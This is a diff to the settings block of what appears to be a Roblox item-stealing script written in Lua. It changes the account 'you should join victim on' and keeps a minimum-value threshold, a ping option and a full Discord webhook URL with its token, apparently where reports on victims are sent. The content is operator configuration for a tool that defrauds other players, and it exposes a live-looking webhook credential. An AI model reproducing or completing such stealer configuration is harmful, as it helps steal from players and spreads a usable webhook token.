@@ -1,4 +1,4 @@
-_G.Username = "Dog_1111118" -- user you should join victim on
+_G.Username = "Eduardosantosfar" -- user you should join victim on
 _G.min_value = 0.3
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1360134121304883281/3h74u37ch4Vn-vaiiqx5CR-GaHhilkkihb-s6QvjRZXJJiP9I2wvC-K3vhpibG90LrzT"
